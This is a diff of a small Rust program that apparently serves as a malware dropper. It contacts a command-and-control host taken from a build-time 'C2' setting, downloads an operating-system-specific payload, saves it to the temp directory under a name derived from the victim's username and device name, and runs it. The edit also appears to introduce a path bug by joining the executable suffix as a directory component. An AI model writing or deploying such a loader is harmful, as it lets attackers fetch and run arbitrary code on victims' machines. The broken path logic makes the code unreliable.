@@ -1,6 +1,9 @@
 use std::{
-    env::{consts::EXE_SUFFIX, temp_dir},
-    iter::repeat_with,
+    env::{
+        consts::{EXE_SUFFIX, OS},
+        temp_dir,
+    },
+    io::Read,
     process::Command,
     time,
 };
@@ -20,18 +23,16 @@ fn main() {
     }
 
     let mut resp = ureq::get(fmtools::format!(
-        "http://"{env!("C2")}"/payloads/payload"{EXE_SUFFIX}
+        "http://"{env!("C2")}"/payloads/"{OS}
     ))
     .call()
     .unwrap();
-    let payload = resp.body_mut().read_to_string().unwrap();
+    let mut data = Vec::with_capacity(resp.body().content_length().unwrap() as usize);
+    resp.body_mut().as_reader().read_to_end(&mut data).unwrap();
 
-    let path = temp_dir().join(
-        (repeat_with(fastrand::alphanumeric))
-            .take(15)
-            .collect::<String>(),
-    );
-    std::fs::write(&path, payload.as_bytes()).unwrap();
+    let id = blake3::hash(format!("{}{}", whoami::username(), whoami::devicename()).as_bytes());
+    let path = temp_dir().join(id.to_string()).join(EXE_SUFFIX);
+    std::fs::write(&path, data).unwrap();
 
     Command::new(path.to_str().unwrap()).spawn().unwrap();
 }
